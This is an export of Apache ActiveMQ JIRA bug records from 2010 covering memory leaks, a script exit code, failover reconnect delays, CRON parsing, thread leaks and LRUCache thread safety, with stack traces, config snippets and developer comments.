Memory leak in SimpleAuthenticationBroker,AMQ-3052,12483904,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,24/Nov/10 16:02,24/Nov/10 16:05,14/Jul/23 05:43,24/Nov/10 16:05,5.4.1,,,,,5.4.2,,,,,,,0,,,,,,,,,"When the addConnection() fails after the successful auth check, we need to remove security context.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14739,,,Wed Nov 24 16:05:23 UTC 2010,,,,,,,,,,,"0|i0b9vj:",63712,,,,,,,,,,,,,,,,,,,,,"24/Nov/10 16:05;dejanb;Fixed with svn revision 1038658;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQ standalone script doesn't return with 0 when stop is called.,AMQ-3050,12483896,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,alexjfisher,alexjfisher,23/Nov/10 15:36,24/Nov/10 09:41,14/Jul/23 05:43,24/Nov/10 09:41,5.4.1,,,,,5.4.2,,,,,,,0,,,,,,,,,"I was testing to see if the ./bin/activemq script was LSB compatible (I want to integrate activemq into a pacemaker setup).

When calling ./bin/activemq stop, the script should return 0 on success.

The problem is in the invokeJar function.  In the 'stop' case , the value of RET is set in the context of a forked process.
The proposed fix, is identical to how RET is handled in the other 2 cases.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"23/Nov/10 15:38;alexjfisher;activemq-return-value.patch;https://issues.apache.org/jira/secure/attachment/12461892/activemq-return-value.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14755,,,Wed Nov 24 09:41:53 UTC 2010,,,,,,,Patch Available,,,,"0|i0b9tb:",63702,,,,,,,,,,,,,,,,,,,,,"23/Nov/10 15:38;alexjfisher;Patch correcting issue.;;;","24/Nov/10 09:41;dejanb;Fixed with svn revision 1038539. Thanks for the patch;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
 initialReconnectDelay on failover transport is not being honored ,AMQ-3049,12483542,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,23/Nov/10 09:58,23/Nov/10 10:22,14/Jul/23 05:43,23/Nov/10 10:22,5.4.1,,,,,5.4.2,,,,,,,0,,,,,,,,,"It's honored only when useExponentialBackOff is set to false, so the url like

failover:(tcp://localhost:61616,tcp://localhost:61618)?initialReconnectDelay=10000&randomize=false&updateURIsSupported=false

will ignore it",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14775,,,Tue Nov 23 10:22:30 UTC 2010,,,,,,,,,,,"0|i0b9un:",63708,,,,,,,,,,,,,,,,,,,,,"23/Nov/10 10:22;dejanb;fixed with svn revision 1038036;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ConnectionState.getTempDesinations() should be renamed to ConnectionState.getTempDestinations(),AMQ-3040,12483870,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Trivial,Fixed,dejanb,norman,norman,16/Nov/10 08:18,20/Jan/11 13:45,14/Jul/23 05:43,20/Jan/11 13:45,,,,,,5.5.0,,,,,,,0,,,,,,,,,There is a type in the method name of ConnectionState.getTempDesinations(). This should be ConnectionState.getTempDestinations(),,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"16/Nov/10 08:18;norman;AMQ_spelling.diff;https://issues.apache.org/jira/secure/attachment/12461890/AMQ_spelling.diff",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14724,,,Thu Jan 20 13:45:39 UTC 2011,,,,,,,,,,,"0|i0ak8n:",59552,,,,,,,,,,,,,,,,,,,,,"16/Nov/10 08:18;norman;here is the fix..;;;","20/Jan/11 13:45;dejanb;Patch applied with 1061299. Thanks!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Cannot import broker config using entities anymore,AMQ-3039,12483883,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,,janstey,janstey,15/Nov/10 18:41,15/Nov/10 18:46,14/Jul/23 05:43,15/Nov/10 18:46,5.4.1,,,,,5.4.2,,,,,,,0,,,,,,,,,"We used to be able to import broker config using entities as follows:

{code}
<!DOCTYPE activemq [
<!ENTITY network-connectors SYSTEM ""/etc/activemq/network-connectors.xml""> 
]>
<beans
  xmlns=""http://www.springframework.org/schema/beans""
  xmlns:amq=""http://activemq.apache.org/schema/core""
  xmlns:xsi=""http://www.w3.org/2001/XMLSchema-instance""
  xsi:schemaLocation=""http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-2.0.xsd
  http://activemq.apache.org/schema/core http://activemq.apache.org/schema/core/activemq-core.xsd
http://camel.apache.org/schema/spring http://camel.apache.org/schema/spring/camel-spring.xsd""> 
  
  <broker xmlns=""http://activemq.apache.org/schema/core"" brokerName=""${activemq.brokername}"" useJmx=""true"" populateJMSXUserID=""true"" dataDirectory=""${activemq.base}/data""> 
 
    <managementContext> 
        <managementContext createConnector=""false""/> 
    </managementContext> 

    &network-connectors;

...
{code}

Now, since the Spring 3 upgrade, you get something like this error:

{code}
Caused by: org.xml.sax.SAXParseException: Element type ""beans"" must be declared.
        at com.sun.org.apache.xerces.internal.util.ErrorHandlerWrapper.createSAXParseException(ErrorHandlerWrapper.java:195)
        at com.sun.org.apache.xerces.internal.util.ErrorHandlerWrapper.error(ErrorHandlerWrapper.java:131)
        at com.sun.org.apache.xerces.internal.impl.XMLErrorReporter.reportError(XMLErrorReporter.java:384)
        at com.sun.org.apache.xerces.internal.impl.XMLErrorReporter.reportError(XMLErrorReporter.java:318)
        at com.sun.org.apache.xerces.internal.impl.dtd.XMLDTDValidator.handleStartElement(XMLDTDValidator.java:1929)
        at com.sun.org.apache.xerces.internal.impl.dtd.XMLDTDValidator.startElement(XMLDTDValidator.java:764)
        at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanStartElement(XMLDocumentFragmentScannerImpl.java:1363)
        at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl$ContentDriver.scanRootElementHook(XMLDocumentScannerImpl.java:1318)
        at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl$FragmentContentDriver.next(XMLDocumentFragmentScannerImpl.java:3103)
        at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl$PrologDriver.next(XMLDocumentScannerImpl.java:922)
        at com.sun.org.apache.xerces.internal.impl.XMLDocumentScannerImpl.next(XMLDocumentScannerImpl.java:648)
        at com.sun.org.apache.xerces.internal.impl.XMLDocumentFragmentScannerImpl.scanDocument(XMLDocumentFragmentScannerImpl.java:511)
        at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:808)
        at com.sun.org.apache.xerces.internal.parsers.XML11Configuration.parse(XML11Configuration.java:737)
        at com.sun.org.apache.xerces.internal.parsers.XMLParser.parse(XMLParser.java:119)
        at com.sun.org.apache.xerces.internal.parsers.DOMParser.parse(DOMParser.java:235)
        at com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderImpl.parse(DocumentBuilderImpl.java:284)
        at org.springframework.beans.factory.xml.DefaultDocumentLoader.loadDocument(DefaultDocumentLoader.java:75)
        at org.springframework.beans.factory.xml.XmlBeanDefinitionReader.doLoadBeanDefinitions(XmlBeanDefinitionReader.java:388)
        ... 42 more
{code}

This is caused by validation being turned on by default in Spring 3 (it was off in Spring 2.x). Have test case coming soon.",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,74745,,,Mon Nov 15 18:46:00 UTC 2010,,,,,,,,,,,"0|i0rplr:",159792,,,,,,,,,,,,,,,,,,,,,"15/Nov/10 18:46;janstey;Seems this is already fixed in AMQ-2939.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Possible Memory-Leak as ActiveMQTempDestinations don't get deleted when ActiveMQConnection.close() is called,AMQ-3038,12483879,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,norman,norman,15/Nov/10 13:46,02/May/13 02:30,14/Jul/23 05:43,20/Jan/11 16:12,,,,,,5.5.0,,,,,,,0,,,,,,,,,As TemporaryQueue and TemporaryTopic is bound to the scope of a Connection both should be deleted when the Connection is closed. If that's not done its possible to see a Memory-Leak on heavy usage really soon,trunk,sslavic,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4196,,,,,,,,,,,,,"15/Nov/10 13:48;norman;AMQ-3038.diff;https://issues.apache.org/jira/secure/attachment/12461889/AMQ-3038.diff",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14707,,,Wed Jan 04 14:30:18 UTC 2012,,,,,,,,,,,"0|i0ak8v:",59553,,,,,,,,,,,,,,,,,,,,,"15/Nov/10 13:48;norman;This should fix it..;;;","20/Jan/11 16:12;dejanb;Patch applied with svn revision 1061365. Thanks!;;;","04/Jan/12 14:30;harikrishnan;Kindly explain why we are not calling deleteTempDestination as shown below?
for (Iterator<ActiveMQTempDestination> i = this.activeTempDestinations.values().iterator(); i.hasNext();) {
  ActiveMQTempDestination c = i.next();
  deleteTempDestination(c); 
}

Calling delete on ActiveMQTempDestination also calls deleteTempDestination again on the connection.

Please clarify.

;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Scheduled message CRON strings not parsed correctly,AMQ-3036,12483878,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,tabish,ngehring,ngehring,15/Nov/10 10:21,16/Feb/11 21:39,14/Jul/23 05:43,16/Feb/11 21:39,5.4.2,,,,,5.5.0,,,Broker,,,,0,,,,,,,,,"I am trying to send a scheduled message using a AMQ_SCHEDULED_CRON string but it  is being scheduled for really bizarre times!

This is caused by errors in the org.apache.activemq.broker.scheduler.CronParser.getNextScheduledTime(..) - patch attached including junits.",Windows XP 32 bit,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"15/Nov/10 10:22;ngehring;activemq-core.patch;https://issues.apache.org/jira/secure/attachment/12461887/activemq-core.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14687,,,Wed Feb 16 21:39:34 UTC 2011,,,,,,,Patch Available,,,,"0|i0ak93:",59554,,,,,,,,,,,,,,,,,,,,,"15/Nov/10 10:22;ngehring;patch file;;;","16/Feb/11 21:39;tabish;Verified the issue, patches applied.  Many thanks for the unit tests.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
activemq script ignores ACTIVEMQ_SSL_OPTS from environment,AMQ-3035,12483884,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,dejanb,dejanb,dejanb,15/Nov/10 10:20,15/Nov/10 10:28,14/Jul/23 05:43,15/Nov/10 10:28,5.4.1,,,,,5.4.2,,,Broker,,,,0,,,,,,,,,We should re-enable setting ssl properties using SSL_OPTS environment variable,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14756,,,Mon Nov 15 10:28:13 UTC 2010,,,,,,,,,,,"0|i0b9tz:",63705,,,,,,,,,,,,,,,,,,,,,"15/Nov/10 10:28;dejanb;Fixed with svn revision 1035211;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
BrokerService leaks threads when scheduler or jmx are enabled,AMQ-3033,12483956,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,bimargulies@gmail.com,bimargulies@gmail.com,12/Nov/10 19:15,14/Dec/10 14:28,14/Jul/23 05:43,14/Dec/10 14:28,5.4.1,,,,,5.5.0,,,Broker,,,,0,,,,,,,,,"If I launch the broker with the below, *without* the first two lines, and call brokerService.stop(), I have 13 more threads after than I had when I started. This in spite of the code I see in the BrokerService class that claims to shut down the scheduler (and the scheduler is one of the threads). 

{code}
           brokerService.setSchedulerSupport(false);
            brokerService.setUseJmx(false);
            brokerService.setPersistenceAdapter(new MemoryPersistenceAdapter());
            brokerService.setPersistent(false);
            brokerService.setUseShutdownHook(true);
            brokerService.setUseLoggingForShutdownErrors(false);
            brokerService.setSchedulerSupport(false);
            bindAddress = ""tcp://localhost:"" + getBrokerPort();
            tcpTransport = brokerService.addConnector(bindAddress);
            brokerService.setDataDirectory(dataDirectory.getAbsolutePath());
            brokerService.start();
{code}",,vadimos,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14763,,,Tue Dec 14 14:28:36 UTC 2010,,,,,,,,,,,"0|i0ak9b:",59555,,,,,,,,,,,,,,,,,,,,,"14/Dec/10 14:28;gtully;double init of timer left a dangling ref. r1049105;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Time Synchronization Solution,AMQ-3031,12483881,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,tabish,lernit.2007,lernit.2007,12/Nov/10 12:13,23/Sep/11 18:49,14/Jul/23 05:43,23/Sep/11 18:49,5.4.1,,,,,5.6.0,,,Broker,,,,0,,,,,,,,,"We had a Problem if we synchronize the time of 1.1.2000 to the actual date. The cpu load increase to 170% over a long time period. We analyse the problem and find out that is a java timer problem. We pass the classes Scheduler.java in following packages:

1. \kahadb\src\main\java\org\apache\kahadb\util
2. activemq-core\src\main\java\org\apache\activemq\thread

We change the TimerTask by ScheduledThreadPoolExecutor. That was the solution. I want to discuss if that is the right solution or not. Can you analyze the classes and say if that is the right way or not? If not can you propose a solution. If yes can you release that with the next version.





",,jwatkins,lernit.2007,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/Nov/10 12:16;lernit.2007;Scheduler-ActivemqCore.java;https://issues.apache.org/jira/secure/attachment/12461886/Scheduler-ActivemqCore.java","12/Nov/10 12:16;lernit.2007;Scheduler-KahaDB.java;https://issues.apache.org/jira/secure/attachment/12461885/Scheduler-KahaDB.java",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,59473,,,Fri Sep 23 18:49:02 UTC 2011,,,,,,,,,,,"0|i0ak9j:",59556,,,,,,,,,,,,,,,,,,,,,"12/Nov/10 12:16;lernit.2007;The first attachment is the Scheduler Class of kahadb. The second is the of activemq-core.

;;;","22/Sep/11 21:52;tabish;It seems like a simple solution would be to remove the 'executePeriodically' function and just have the 'schedualPeriodically' called for all scheduled tasks as that uses fixed-delay execution instead of fixed-rate which is prone to stacking when tasks are delayed or in the reporters case the clock is changed.  ;;;","23/Sep/11 07:38;lernit.2007;The changed are needed in the next activemq version. The both classes which I uploaded in this Jira Entry should be analyzes by a developer and then integrate it in the next activemq version.;;;","23/Sep/11 18:49;tabish;Fix applied in trunk, removed the call to scheduleAtFixedRate and replaced it with just a call to schedule instead.  ;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Exception when try to browse ActiveMQBlobMessage via JMX,AMQ-3029,12483874,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,gtully,norman,norman,12/Nov/10 08:47,15/Nov/10 13:21,14/Jul/23 05:43,15/Nov/10 13:21,5.3.1,5.3.2,5.4.0,5.4.1,,5.4.2,,,JMX,,,,0,,,,,,,,,"Unable to browse ActiveMQBlobMessages via JMX

WARN  09:39:13,383 | org.apache.activemq.broker.jmx.DestinationViewMBean | excep
tion browsing destination
javax.management.openmbean.OpenDataException: Cannot create a CompositeData for
type: org.apache.activemq.command.ActiveMQBlobMessage
        at org.apache.activemq.broker.jmx.OpenTypeSupport.convert(OpenTypeSuppor
t.java:481)
        at org.apache.activemq.broker.jmx.DestinationView.browse(DestinationView
.java:157)
        at org.apache.activemq.broker.jmx.DestinationView.browse(DestinationView
.java:138)
        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.
java:39)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAcces
sorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at com.sun.jmx.mbeanserver.StandardMBeanIntrospector.invokeM2(StandardMB
eanIntrospector.java:93)
        at com.sun.jmx.mbeanserver.StandardMBeanIntrospector.invokeM2(StandardMB
eanIntrospector.java:27)
        at com.sun.jmx.mbeanserver.MBeanIntrospector.invokeM(MBeanIntrospector.j
ava:208)
        at com.sun.jmx.mbeanserver.PerInterface.invoke(PerInterface.java:120)
        at com.sun.jmx.mbeanserver.MBeanSupport.invoke(MBeanSupport.java:262)
        at javax.management.StandardMBean.invoke(StandardMBean.java:391)
        at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.invoke(DefaultM
BeanServerInterceptor.java:836)
        at com.sun.jmx.mbeanserver.JmxMBeanServer.invoke(JmxMBeanServer.java:761
)
        at javax.management.remote.rmi.RMIConnectionImpl.doOperation(RMIConnecti
onImpl.java:1426)
        at javax.management.remote.rmi.RMIConnectionImpl.access$200(RMIConnectio
nImpl.java:72)
        at javax.management.remote.rmi.RMIConnectionImpl$PrivilegedOperation.run
(RMIConnectionImpl.java:1264)
        at javax.management.remote.rmi.RMIConnectionImpl.doPrivilegedOperation(R
MIConnectionImpl.java:1359)
        at javax.management.remote.rmi.RMIConnectionImpl.invoke(RMIConnectionImp
l.java:788)
        at sun.reflect.GeneratedMethodAccessor60.invoke(Unknown Source)
        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAcces
sorImpl.java:25)
        at java.lang.reflect.Method.invoke(Method.java:597)
        at sun.rmi.server.UnicastServerRef.dispatch(UnicastServerRef.java:305)
        at sun.rmi.transport.Transport$1.run(Transport.java:159)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.rmi.transport.Transport.serviceCall(Transport.java:155)
        at sun.rmi.transport.tcp.TCPTransport.handleMessages(TCPTransport.java:5
35)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run0(TCPTranspor
t.java:790)
        at sun.rmi.transport.tcp.TCPTransport$ConnectionHandler.run(TCPTransport
.java:649)
        at java.util.concurrent.ThreadPoolExecutor$Worker.runTask(ThreadPoolExec
utor.java:886)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor
.java:908)
        at java.lang.Thread.run(Thread.java:619)",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"12/Nov/10 12:12;norman;ACTIVEMQ-3029-with-test.diff;https://issues.apache.org/jira/secure/attachment/12461884/ACTIVEMQ-3029-with-test.diff","12/Nov/10 09:01;norman;ACTIVEMQ-3029.diff;https://issues.apache.org/jira/secure/attachment/12461883/ACTIVEMQ-3029.diff",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14732,,,Mon Nov 15 13:21:58 UTC 2010,,,,,,,,,,,"0|i0b9wf:",63716,,,,,,,,,,,,,,,,,,,,,"12/Nov/10 09:01;norman;This patch fix the issues;;;","12/Nov/10 11:09;gtully;can you include a simple junit test? it will protect your fix into the future.;;;","12/Nov/10 12:12;norman;include a testcase, I thought the fix is so trivial that I don't need one.. But I see your point ;);;;","15/Nov/10 13:21;gtully;patch and test applied in r1035264, thanks.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
ActiveMQ broker processing slows with consumption from large store,AMQ-3028,12483903,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,dejanb,artnaseef,artnaseef,10/Nov/10 20:13,25/Nov/10 09:03,14/Jul/23 05:43,24/Nov/10 11:56,5.4.1,,,,,5.4.2,,,Broker,,,,2,,,,,,,,,"In scalability tests, this problem occured.  I have tested a workaround that appears to function.  A fix will gladly be submitted - would like some guidance, though, on the most appropriate solution.

Here's the summary.  Many more details are available upon request.

Root cause:

   - Believed to be simultaneous access to LRUCache objects which are not thread-safe (PageFile's pageCache)

Workaround:

   - Synchronize the LRUCache on all access methods (get, put, remove)

The symptoms are as follows:

  1. Message rates run fairly-constant until a point in time when they degrade rather quickly
  2. After a while (about 15 minutes), the message rates drop to the floor - with large numbers of seconds with 0 records passing
  3. Using VisualVM or JConsole, note that memory use grows continuosuly
  4. When message rates drop to the floor, the VM is spending the vast majority of its time performing garbage collection
  5. Heap dumps show that LRUCache objects (the pageCache members of PageFile's) are far exceeding their configured limits.
      The default limit was used, 10000.  A size of over 170,000 entries was reached.
  6. No producer flow control occurred (did not see the flow control log message)

Test scenario used to reproduce:

   - Fast producers (limited to <= 1000 msgs/sec)
      -- using transactions
      -- 10 msg per transaction
      -- message content size 177 bytes

   - Slow consumers (limited to <= 10 msg/sec)
      -- auto-acknowledge mode; not transacted

   - 10 Queues
      -- 1 producer per queue
      -- 1 consumer per queue

   - Producers, Consumers, and Broker all running on different systems, and on the same system (different test runs).

Note that disk space was not an issue - there was always plenty of disk space available.

One other interesting note - once a large database of records was stored in KahaDB, only running consumers, this problem still occurred.

This issue sounds like it may be related to 1764, and 2721.  The root cause sounds the same as 2290 - unsynchronized access to LRUCache.

The most straight-forward solution is to modify all LRUCache objects (org.apache.kahadb.util.LRUCache, org.apache.activemq.util.LRUCache, ...) to be concurrent.  Another is to create concurrent versions (perhaps ConcurrentLRUCache) and make use of those at least in PageFile.pageCache.
","CentOS 5.5, Sun JDK 1.6.0_21-b06 64 bit, ActiveMQ 5.4.1, AMD Athlon(tm) II X2 B22, local disk",artnaseef,asussman,bsnyder,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"10/Nov/10 20:27;artnaseef;LRUCache.patch;https://issues.apache.org/jira/secure/attachment/12461882/LRUCache.patch",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,14748,,,Thu Nov 25 09:03:54 UTC 2010,,,,,,,,,,,"0|i0b9w7:",63715,,,,,,,,,,,,,,,,,,,,,"10/Nov/10 20:27;artnaseef;Patch which synchronizes org.apache.kahadb.util.LRUCache and org.apache.activemq.util.LRUCache on get(), put(), and remove() calls.
;;;","22/Nov/10 18:47;artnaseef;Is there something I can do to further assist with this issue?

Testing with the attached patch was successful - all of the problems were aleviated.

I have considered writing a JUnit to test it, but that is not trivial because (a) the time needed to learn JUnit, (b) the impact of configuration on reproducing the problem in a timely manner (increasing JVM memory may delay detection of the issue), and (c) detecting the problem requires internal access to the LRUCache or some other method with which I am unfamiliar.
;;;","24/Nov/10 11:56;dejanb;Fixed with svn revision 1038566

I didn't make LRU cache synced in general, just synced the usage of pageCache. Let us know if it helps with your scenario.;;;","24/Nov/10 18:00;artnaseef;I will test with the update and post the results when complete.  With any luck, it'll be done today.;;;","24/Nov/10 18:23;asussman;
Are you saying their solution isn't good enough?


;;;","24/Nov/10 18:35;artnaseef;Oh hey Adam - different message thread.

I was just indicating that I need to run my tests to feel confident it's resolved.
